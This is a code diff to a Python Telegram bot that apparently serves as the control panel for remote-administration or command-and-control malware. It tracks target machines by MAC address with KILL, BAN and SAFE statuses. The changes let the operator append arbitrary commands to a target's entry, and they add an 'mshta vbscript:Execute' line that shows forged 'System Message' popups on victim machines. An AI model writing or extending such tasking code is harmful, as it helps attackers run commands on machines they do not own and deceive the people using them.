@@ -160,7 +160,7 @@ def write_to_files(mac: str, username: str, status: str):
                 f.write(content + "\n")
     except Exception as e: logger.error(f"File write error: {e}")
 
-def batch_update_users(target_input: str, new_status_base: str, extra_text: str = ""):
+def batch_update_users(target_input: str, new_status_base: str, extra_text: str = "", append_only: bool = False):
     if not os.path.exists(USERS_FILE): return 0, []
     targets = [u.strip() for u in target_input.split('-') if u.strip()]
     updated_users, new_lines = [], []
@@ -172,11 +172,16 @@ def batch_update_users(target_input: str, new_status_base: str, extra_text: str 
         if " -> " in line:
             parts = line.split(" -> ")
             u_part = parts[0].strip()
-            current_status = parts[1].strip() # Get what's already there (e.g., KILL)
+            current_status = parts[1].strip()
 
             if u_part in targets:
-                # If you want to keep 'KILL' or 'BAN' but add the message after it:
-                status_str = f"{current_status} {extra_text}".strip()
+                if append_only:
+                    # Keep existing status (KILL/BAN/SAFE) and add the command
+                    status_str = f"{current_status} {extra_text}".strip()
+                else:
+                    # Overwrite status (Used for Grant, Ban, Kill)
+                    status_str = f"{new_status_base} {extra_text}".strip()
+                
                 new_lines.append(f"{u_part} -> {status_str}\n")
                 updated_users.append(u_part)
             else:
@@ -329,9 +334,14 @@ async def handle_exec_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("📝 Send text:", reply_markup=cancel_keyboard()); return WAITING_FOR_EXEC_TEXT
 
 async def handle_exec_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Pass "" as the second argument so it relies on the existing status in the file
-    count, _ = batch_update_users(context.user_data.get("exec_targets", ""), "", update.message.text)
-    await update.message.reply_text(f"⚡ Done."); return await start(update, context)
+    # Set append_only=True so it doesn't change BAN/KILL to SAFE
+    count, _ = batch_update_users(
+        context.user_data.get("exec_targets", ""), 
+        "", 
+        update.message.text, 
+        append_only=True
+    )
+    await update.message.reply_text(f"⚡ Command added to {count} users."); return await start(update, context)
 
 async def handle_pop_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["pop_targets"] = update.message.text
@@ -339,10 +349,14 @@ async def handle_pop_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_pop_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
     vbs = f'mshta vbscript:Execute("msgbox ""{update.message.text.strip()}"",64,""System Message"":close")'
-    # Pass "" as the second argument
-    count, _ = batch_update_users(context.user_data.get("pop_targets", ""), "", vbs)
-    await update.message.reply_text(f"💬 Sent to {count}."); return await start(update, context)
-
+    # Set append_only=True
+    count, _ = batch_update_users(
+        context.user_data.get("pop_targets", ""), 
+        "", 
+        vbs, 
+        append_only=True
+    )
+    await update.message.reply_text(f"💬 Popup added to {count} users."); return await start(update, context)
 # ---------- APP SETUP ----------
 application = Application.builder().token(BOT_TOKEN).build()
 conv_handler = ConversationHandler(
